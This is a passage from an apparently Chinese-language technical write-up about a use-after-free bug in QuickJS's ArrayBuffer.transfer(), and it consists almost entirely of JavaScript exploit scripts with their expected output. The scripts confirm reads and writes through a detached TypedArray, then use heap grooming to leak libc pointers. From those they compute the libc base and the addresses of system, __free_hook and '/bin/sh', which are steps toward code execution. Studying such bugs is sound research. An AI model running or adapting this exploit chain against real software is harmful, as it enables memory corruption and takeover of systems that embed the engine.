<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Calling ab1.transfer()..."</span>);

<span class="hljs-keyword">const</span> ab2 = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">const</span> ta2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(ab2);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Transfer completed"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ab1 should be detached now"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ab1.byteLength ="</span>, ab1.<span class="hljs-property">byteLength</span>, <span class="hljs-string">"(should be 0)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta2 is the new TypedArray pointing to transferred data"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 阶段4：检测UAF - 读取</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 4] Testing UAF: Reading from detached TypedArray..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Attempting to read ta1[0] (should fail but won't)..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> oldValue = ta1[<span class="hljs-number">0</span>];
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;31m"</span> + <span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [!!! UAF VULNERABILITY CONFIRMED !!!]"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>) + <span class="hljs-string">"\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ❌ Expected behavior: TypeError (ArrayBuffer is detached)"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Actual behavior: Successfully read value = 0x"</span> + 
                oldValue.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Analysis:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"    - ArrayBuffer ab1 is marked as detached"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"    - But TypedArray ta1 still has valid length and data pointer"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"    - Can access memory that should be inaccessible"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 阶段5：检测UAF - 写入</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 5] Testing UAF: Writing through detached TypedArray..."</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Attempting to write ta1[0] = 0xDEADBEEF..."</span>);
    
    ta1[<span class="hljs-number">0</span>] = <span class="hljs-number">0xDEADBEEF</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Write operation succeeded (should have failed)"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 阶段6：检查内存损坏</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 6] Checking for memory corruption..."</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Reading ta2[0] to see if new buffer was affected..."</span>);
    
    <span class="hljs-keyword">const</span> newValue = ta2[<span class="hljs-number">0</span>];
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta2[0] = 0x"</span> + newValue.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-keyword">if</span> (newValue === <span class="hljs-number">0xDEADBEEF</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;31m  [!! CRITICAL !!] Memory corruption detected!"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Write through ta1 affected ta2's data!"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  This indicates the buffers share or overlap memory.\x1b[0m"</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (newValue === <span class="hljs-number">0xAAAA0000</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;33m  [!] Data preserved in new buffer"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Write through ta1 affected old memory location"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Old memory might be reused by other objects\x1b[0m"</span>);
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 阶段7：多次读写测试</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 7] Extended UAF test - multiple operations..."</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        ta1[i] = <span class="hljs-number">0xBAAD0000</span> + i;
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Wrote pattern 0xBAAD0000-0xBAAD0004 through ta1"</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Reading back through ta1:"</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ta1["</span> + i + <span class="hljs-string">"] = 0x"</span> + 
                    ta1[i].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Checking ta2 for corruption:"</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ta2["</span> + i + <span class="hljs-string">"] = 0x"</span> + 
                    ta2[i].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 总结</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Summary] UAF Vulnerability Characteristics:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  1. TypedArray retains data pointer after ArrayBuffer.transfer()"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  2. Can read from freed/transferred memory"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  3. Can write to freed/transferred memory"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  4. May corrupt new ArrayBuffer if memory is reused"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  5. No bounds checking on detached buffer"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m[✓] Vulnerability successfully reproduced!\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m"</span> + <span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [✓] NO UAF DETECTED (Expected secure behavior)"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>) + <span class="hljs-string">"\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Error message:"</span>, e.<span class="hljs-property">message</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  TypedArray correctly detached and access denied"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Verification complete"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
</code></pre>
<p><strong>预期输出（漏洞版本）：</strong></p>
<pre><code class="hljs language-ini" lang="ini">======================================================================
<span class="hljs-section">[*]</span> QuickJS ArrayBuffer.transfer() UAF Vulnerability <span class="hljs-attr">Verification</span>
======================================================================

<span class="hljs-section">[Phase 1]</span> Creating ArrayBuffer and TypedArray...
  <span class="hljs-section">[+]</span> ArrayBuffer created: <span class="hljs-attr">size</span> = <span class="hljs-number">0</span>x100 bytes
  <span class="hljs-section">[+]</span> TypedArray created: <span class="hljs-attr">length</span> = <span class="hljs-number">64</span>
  <span class="hljs-section">[+]</span> TypedArray <span class="hljs-attr">byteLength</span> = <span class="hljs-number">256</span>

<span class="hljs-section">[Phase 2]</span> Filling with test pattern...
  <span class="hljs-section">[+]</span> Pattern: 0xAAAA0000, 0xAAAA0001, 0xAAAA0002, ...
  <span class="hljs-section">[+]</span> ta1<span class="hljs-section">[0]</span> = 0xaaaa0000
  <span class="hljs-section">[+]</span> ta1<span class="hljs-section">[1]</span> = 0xaaaa0001
  <span class="hljs-section">[+]</span> ta1<span class="hljs-section">[2]</span> = 0xaaaa0002

<span class="hljs-section">[Phase 3]</span> Triggering vulnerability via transfer()...
  <span class="hljs-section">[*]</span> Calling ab1.transfer()...
  <span class="hljs-section">[+]</span> Transfer completed
  <span class="hljs-section">[+]</span> ab1 should be detached now
  <span class="hljs-section">[+]</span> <span class="hljs-attr">ab1.byteLength</span> = <span class="hljs-number">0</span> (should be <span class="hljs-number">0</span>)
  <span class="hljs-section">[+]</span> ta2 is the new TypedArray pointing to transferred data

<span class="hljs-section">[Phase 4]</span> Testing UAF: Reading from detached TypedArray...
  <span class="hljs-section">[*]</span> Attempting to read ta1<span class="hljs-section">[0]</span> (should fail but won't)...

======================================================================
  <span class="hljs-section">[!!! UAF VULNERABILITY CONFIRMED !!!]</span>
======================================================================

  ❌ Expected behavior: TypeError (ArrayBuffer is detached)
  ✓ Actual behavior: Successfully read <span class="hljs-attr">value</span> = <span class="hljs-number">0</span>xaaaa0000

  Analysis:
    - ArrayBuffer ab1 is marked as detached
    - But TypedArray ta1 still has valid length and data pointer
    - Can access memory that should be inaccessible

<span class="hljs-section">[Phase 5]</span> Testing UAF: Writing through detached TypedArray...
  <span class="hljs-section">[*]</span> Attempting to write ta1<span class="hljs-section">[0]</span> = 0xDEADBEEF...
  ✓ Write operation succeeded (should have failed)

<span class="hljs-section">[Phase 6]</span> Checking for memory corruption...
  <span class="hljs-section">[*]</span> Reading ta2<span class="hljs-section">[0]</span> to see if new buffer was affected...
  <span class="hljs-section">[+]</span> ta2<span class="hljs-section">[0]</span> = 0xdeadbeef

  <span class="hljs-section">[!! CRITICAL !!]</span> Memory corruption detected!
  Write through ta1 affected ta2's data!
  This indicates the buffers share or overlap memory.

<span class="hljs-section">[Summary]</span> UAF Vulnerability Characteristics:
  1. TypedArray retains data pointer after ArrayBuffer.transfer()
  2. Can read from freed/transferred memory
  3. Can write to freed/transferred memory
  4. May corrupt new ArrayBuffer if memory is reused
  5. No bounds checking on detached buffer

<span class="hljs-section">[✓]</span> Vulnerability successfully reproduced!
</code></pre>
<h4 data-id="heading-21">实验2：任意地址读取验证</h4>
<p>利用UAF，我们可以读取堆上残留的指针，从而泄露libc和堆地址：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// arbitrary_read_verify.js - 验证任意读能力</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">v</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"0x"</span> + v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">16</span>, <span class="hljs-string">"0"</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Arbitrary Read Capability Verification"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤1：堆风水 - 创建大块触发unsorted bin</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 1] Heap grooming - creating large chunks..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Purpose: Populate unsorted bin to get libc pointers"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created tmp1: 0x800 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created tmp5: 0x800 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] These will be used to stabilize heap layout"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤2：创建目标ArrayBuffer</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 2] Creating target ArrayBuffer for leak..."</span>);

<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ab1: 0x800 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ta1: BigUint64Array view"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1.length = "</span> + ta1.<span class="hljs-property">length</span> + <span class="hljs-string">" (64-bit elements)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤3：创建小块用于堆布局</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 3] Creating small buffers for heap layout..."</span>);

<span class="hljs-keyword">const</span> tmp2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created 3 small buffers (0x10 bytes each)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] These help control heap chunk placement"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤4：触发UAF</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 4] Triggering UAF via transfer()..."</span>);

<span class="hljs-keyword">let</span> ab1_f = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta1_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1_f);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Called ab1.transfer()"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created new TypedArray ta1_f on transferred buffer"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤5：释放新buffer，让内存进入bins</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 5] Freeing new buffer to populate bins..."</span>);

ab1_f = <span class="hljs-literal">null</span>;
ta1_f = <span class="hljs-literal">null</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Set ab1_f = null"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Set ta1_f = null"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Chunk will enter unsorted bin or tcache"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Bin metadata will contain libc pointers"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤6：通过UAF读取泄露的指针</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 6] Reading leaked pointers via UAF..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Using ta1 (which still has dangling pointer)..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> leaked_value = ta1[<span class="hljs-number">0</span>];
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m  [✓] Successfully read via dangling pointer!\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Raw leaked value: "</span> + <span class="hljs-title function_">tohex</span>(leaked_value));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 步骤7：分析泄露的数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 7] Analyzing leaked data..."</span>);
    
    <span class="hljs-comment">// 检查是否为libc指针（高位应该是0x7f）</span>
    <span class="hljs-keyword">const</span> addr_str = leaked_value.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
    <span class="hljs-keyword">const</span> is_userspace = addr_str.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">12</span> &amp;&amp; addr_str.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"7f"</span>);
    
    <span class="hljs-keyword">if</span> (is_userspace) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked value appears to be a libc pointer!"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - High byte: 0x7f (userspace high address)"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - Length: "</span> + addr_str.<span class="hljs-property">length</span> + <span class="hljs-string">" hex digits"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
        <span class="hljs-comment">// 计算libc基址（偏移需要根据实际libc版本调整）</span>
        <span class="hljs-comment">// 这里假设泄露的是main_arena+96的地址</span>
        <span class="hljs-keyword">const</span> libc_leak = leaked_value;
        <span class="hljs-keyword">const</span> libc_offset = <span class="hljs-number">0x203b20n</span>; <span class="hljs-comment">// 根据实际环境调整</span>
        <span class="hljs-keyword">const</span> libc_base = libc_leak - libc_offset;
        
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 8] Calculating addresses..."</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked pointer: "</span> + <span class="hljs-title function_">tohex</span>(libc_leak));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Assumed offset: "</span> + <span class="hljs-title function_">tohex</span>(libc_offset));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Calculated libc base: "</span> + <span class="hljs-title function_">tohex</span>(libc_base));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
        <span class="hljs-comment">// 验证地址合理性</span>
        <span class="hljs-keyword">const</span> base_str = libc_base.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
        <span class="hljs-keyword">if</span> (base_str.<span class="hljs-property">length</span> === <span class="hljs-number">12</span> &amp;&amp; base_str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">"000"</span>)) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;32m[✓] Libc base looks valid (aligned to page)\x1b[0m"</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;33m[⚠] Libc base may be incorrect\x1b[0m"</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      Offset 0x203b20 might not match your libc version"</span>);
        }
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
        <span class="hljs-comment">// 计算常用函数地址</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 9] Computing useful addresses..."</span>);
        <span class="hljs-keyword">const</span> system_offset = <span class="hljs-number">0x58750n</span>;
        <span class="hljs-keyword">const</span> free_hook_offset = <span class="hljs-number">0x203b20n</span>;
        <span class="hljs-keyword">const</span> str_offset = <span class="hljs-number">0x1b45bd</span>;
        
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] system@libc:      "</span> + <span class="hljs-title function_">tohex</span>(libc_base + system_offset));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] __free_hook:      "</span> + <span class="hljs-title function_">tohex</span>(libc_base + free_hook_offset));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] \"/bin/sh\" string: "</span> + <span class="hljs-title function_">tohex</span>(libc_base + <span class="hljs-title class_">BigInt</span>(str_offset)));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (leaked_value &lt; <span class="hljs-number">0x1000000n</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked value appears to be a small integer"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - Might be heap metadata or size field"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked value appears to be a heap pointer"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - Could be used to calculate heap base"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    }
    
    <span class="hljs-comment">// 步骤10：读取更多数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 10] Reading additional memory content..."</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Dumping first 16 qwords via UAF:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">const</span> val = ta1[i];
            <span class="hljs-keyword">const</span> hex_val = <span class="hljs-title function_">tohex</span>(val);
            <span class="hljs-keyword">const</span> offset = <span class="hljs-string">"+"</span> + (i * <span class="hljs-number">8</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">3</span>, <span class="hljs-string">"0"</span>);
            
            <span class="hljs-comment">// 分析每个值的可能含义</span>
            <span class="hljs-keyword">let</span> annotation = <span class="hljs-string">""</span>;
            <span class="hljs-keyword">const</span> val_str = val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
            <span class="hljs-keyword">if</span> (val_str.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"7f"</span>) &amp;&amp; val_str.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">12</span>) {
                annotation = <span class="hljs-string">" &lt;- possible libc pointer"</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val === <span class="hljs-number">0n</span>) {
                annotation = <span class="hljs-string">" &lt;- NULL"</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val &lt; <span class="hljs-number">0x1000n</span>) {
                annotation = <span class="hljs-string">" &lt;- small value (size/flag?)"</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val_str.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">12</span>) {
                annotation = <span class="hljs-string">" &lt;- possible heap pointer"</span>;
            }
            
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ["</span> + offset + <span class="hljs-string">"] "</span> + hex_val + annotation);
        } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ["</span> + offset + <span class="hljs-string">"] &lt;read failed&gt;"</span>);
        }
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 总结</span>
